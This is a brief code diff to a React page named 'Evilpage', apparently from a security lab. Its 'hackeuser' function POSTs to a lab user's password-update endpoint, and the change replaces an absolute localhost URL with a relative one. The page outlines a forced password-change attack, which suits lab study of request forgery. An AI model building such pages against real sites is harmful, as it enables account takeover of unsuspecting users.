@@ -7,7 +7,7 @@ export default function Evilpage() {
     }, []);
 
     const hackeuser = async () => {
-        let res = await fetch("http://localhost:3000/api/lab-user/updatepassword",{
+        let res = await fetch("/api/lab-user/updatepassword",{
         method : "POST",
         headers : {
             "Content-Type" : "application/json"
